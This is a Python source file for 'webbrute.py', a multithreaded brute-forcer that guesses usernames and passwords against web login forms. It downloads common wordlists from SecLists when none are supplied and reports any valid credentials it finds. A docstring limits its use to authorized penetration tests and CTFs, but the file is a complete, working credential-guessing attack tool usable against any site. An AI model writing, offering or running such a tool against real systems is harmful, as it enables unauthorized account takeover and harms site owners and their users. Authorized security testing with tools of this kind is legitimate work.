#!/usr/bin/env python3
"""
webbrute.py — HTTP POST login brute-forcer for authorized penetration testing.

AUTHORIZATION: Only run this against systems you own or have explicit written
permission to test (e.g. a scoped CPTC / CTF / pentest engagement). Unauthorized
credential attacks are illegal in most jurisdictions.

The target is described by a URL and the POST body parameters. Put the markers
^USER^ and ^PASS^ wherever the username and password go in the POST data:

    python3 webbrute.py \
        -u https://target.tld/login \
        -d "username=^USER^&password=^PASS^&submit=Login" \
        -L users.txt -P passwords.txt \
        -f "Invalid credentials"

Success detection (pick what fits the app):
    -f / --fail-string     string present in the body ONLY on FAILURE (login ok = absent)
    -s / --success-string  string present in the body ONLY on SUCCESS
    --fail-code            HTTP status that means failure (default: treat 200 as needing a string)
    --success-code         HTTP status that means success (e.g. 302 redirect)
If none are given, a 302 redirect or a Set-Cookie session is treated as success.
"""

from __future__ import annotations

import argparse
import itertools
import os
import queue
import sys
import threading
import time
import urllib.request
from dataclasses import dataclass

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("This tool needs the 'requests' library:  pip install requests")


# Small, well-known wordlists from the SecLists project (BSD-licensed).
WORDLIST_SOURCES = {
    "users": (
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/"
        "Usernames/top-usernames-shortlist.txt"
    ),
    "passwords": (
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/"
        "Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
    ),
}


def download_wordlist(kind: str, dest: str) -> str:
    """Fetch a common users/passwords list if the user didn't supply one."""
    url = WORDLIST_SOURCES[kind]
    print(f"[*] No {kind} list given — downloading common {kind} to {dest}")
    print(f"    source: {url}")
    req = urllib.request.Request(url, headers={"User-Agent": "webbrute/1.0"})
    with urllib.request.urlopen(req, timeout=30) as resp:  # noqa: S310 (trusted host)
        data = resp.read()
    with open(dest, "wb") as fh:
        fh.write(data)
    print(f"[+] Saved {len(data.splitlines())} {kind}")
    return dest


def load_lines(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        return [ln.rstrip("\r\n") for ln in fh if ln.strip() and not ln.startswith("#")]


@dataclass
class Target:
    url: str
    data_template: str
    method: str
    headers: dict
    fail_string: str | None
    success_string: str | None
    fail_code: int | None
    success_code: int | None
    timeout: float
    allow_redirects: bool


def build_session(retries: int) -> requests.Session:
    sess = requests.Session()
    retry = Retry(
        total=retries,
        backoff_factor=0.5,
        status_forcelist=(429, 500, 502, 503, 504),
        allowed_methods=frozenset(["GET", "POST"]),
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
    sess.mount("http://", adapter)
    sess.mount("https://", adapter)
    return sess


def is_success(resp: requests.Response, t: Target) -> bool:
    """Decide whether a response represents a valid login."""
    if t.success_code is not None:
        return resp.status_code == t.success_code
    if t.fail_code is not None and resp.status_code == t.fail_code:
        return False
    if t.success_string is not None:
        return t.success_string in resp.text
    if t.fail_string is not None:
        return t.fail_string not in resp.text
    # No explicit signal: a redirect or a freshly-set session cookie usually means success.
    if resp.status_code in (301, 302, 303, 307, 308):
        return True
    if "set-cookie" in {k.lower() for k in resp.headers}:
        return True
    return False


def attempt(sess: requests.Session, t: Target, user: str, pwd: str) -> bool:
    body = t.data_template.replace("^USER^", user).replace("^PASS^", pwd)
    data = dict(kv.split("=", 1) for kv in body.split("&") if "=" in kv)
    resp = sess.request(
        t.method,
        t.url,
        data=data,
        headers=t.headers,
        timeout=t.timeout,
        allow_redirects=t.allow_redirects,
    )
    return is_success(resp, t)


class Worker(threading.Thread):
    def __init__(self, jobs, t, retries, delay, stop_event, results, counter, lock):
        super().__init__(daemon=True)
        self.jobs = jobs
        self.t = t
        self.sess = build_session(retries)
        self.delay = delay
        self.stop_event = stop_event
        self.results = results
        self.counter = counter
        self.lock = lock

    def run(self):
        while not self.stop_event.is_set():
            try:
                user, pwd = self.jobs.get_nowait()
            except queue.Empty:
                return
            try:
                ok = attempt(self.sess, self.t, user, pwd)
            except requests.RequestException as exc:
                with self.lock:
                    self.counter[0] += 1
                print(f"[!] error {user}:{pwd} -> {exc}", file=sys.stderr)
                self.jobs.task_done()
                continue
            with self.lock:
                self.counter[0] += 1
                n = self.counter[0]
            if ok:
                print(f"\n[+] VALID CREDENTIAL FOUND:  {user} : {pwd}")
                self.results.append((user, pwd))
                if self.t_stop_on_hit:
                    self.stop_event.set()
            elif n % 50 == 0:
                print(f"    ...{n} attempts (last tried {user}:{pwd})")
            self.jobs.task_done()
            if self.delay:
                time.sleep(self.delay)

    # set by caller
    t_stop_on_hit = True


def main() -> int:
    ap = argparse.ArgumentParser(
        description="HTTP POST login brute-forcer for authorized testing.",
        epilog="Use ^USER^ and ^PASS^ markers in --data for the injection points.",
    )
    ap.add_argument("-u", "--url", required=True, help="target login URL")
    ap.add_argument(
        "-d", "--data", required=True,
        help="POST body with ^USER^ and ^PASS^ markers",
    )
    ap.add_argument("-L", "--userlist", help="username wordlist (downloaded if omitted)")
    ap.add_argument("-P", "--passlist", help="password wordlist (downloaded if omitted)")
    ap.add_argument("-l", "--user", help="single username instead of a list")
    ap.add_argument("-f", "--fail-string", help="string present only on FAILED login")
    ap.add_argument("-s", "--success-string", help="string present only on SUCCESSFUL login")
    ap.add_argument("--fail-code", type=int, help="HTTP status meaning failure")
    ap.add_argument("--success-code", type=int, help="HTTP status meaning success (e.g. 302)")
    ap.add_argument("-X", "--method", default="POST", help="HTTP method (default POST)")
    ap.add_argument("-H", "--header", action="append", default=[], help="extra header 'Name: value'")
    ap.add_argument("-t", "--threads", type=int, default=8, help="concurrent threads (default 8)")
    ap.add_argument("--delay", type=float, default=0.0, help="per-thread delay between tries (s)")
    ap.add_argument("--timeout", type=float, default=15.0, help="request timeout (s)")
    ap.add_argument("--retries", type=int, default=2, help="network retries per request")
    ap.add_argument("--follow-redirects", action="store_true", help="follow 3xx redirects")
    ap.add_argument("--continue", dest="keep_going", action="store_true",
                    help="keep going after the first valid credential")
    args = ap.parse_args()

    if "^USER^" not in args.data or "^PASS^" not in args.data:
        ap.error("--data must contain both ^USER^ and ^PASS^ markers")

    headers = {"User-Agent": "Mozilla/5.0 (webbrute)"}
    for h in args.header:
        if ":" not in h:
            ap.error(f"bad header (need 'Name: value'): {h}")
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()

    # Resolve usernames.
    if args.user:
        users = [args.user]
    else:
        ulist = args.userlist or download_wordlist("users", "users.txt")
        users = load_lines(ulist)

    # Resolve passwords.
    plist = args.passlist or download_wordlist("passwords", "passwords.txt")
    passwords = load_lines(plist)

    total = len(users) * len(passwords)
    print(f"[*] Target : {args.method} {args.url}")
    print(f"[*] Users  : {len(users)}   Passwords: {len(passwords)}   Combos: {total}")
    print(f"[*] Threads: {args.threads}   Delay: {args.delay}s\n")

    target = Target(
        url=args.url,
        data_template=args.data,
        method=args.method.upper(),
        headers=headers,
        fail_string=args.fail_string,
        success_string=args.success_string,
        fail_code=args.fail_code,
        success_code=args.success_code,
        timeout=args.timeout,
        allow_redirects=args.follow_redirects,
    )

    jobs: queue.Queue = queue.Queue()
    for combo in itertools.product(users, passwords):
        jobs.put(combo)

    stop_event = threading.Event()
    results: list = []
    counter = [0]
    lock = threading.Lock()

    Worker.t_stop_on_hit = not args.keep_going

    start = time.time()
    workers = [
        Worker(jobs, target, args.retries, args.delay, stop_event, results, counter, lock)
        for _ in range(max(1, args.threads))
    ]
    for w in workers:
        w.start()
    try:
        while any(w.is_alive() for w in workers):
            for w in workers:
                w.join(timeout=0.3)
    except KeyboardInterrupt:
        print("\n[!] Interrupted — stopping.")
        stop_event.set()

    elapsed = time.time() - start
    print(f"\n[*] Done. {counter[0]} attempts in {elapsed:.1f}s "
          f"({counter[0] / elapsed:.1f}/s)" if elapsed else "")
    if results:
        print("[+] Valid credentials:")
        for u, p in results:
            print(f"      {u} : {p}")
        return 0
    print("[-] No valid credentials found.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
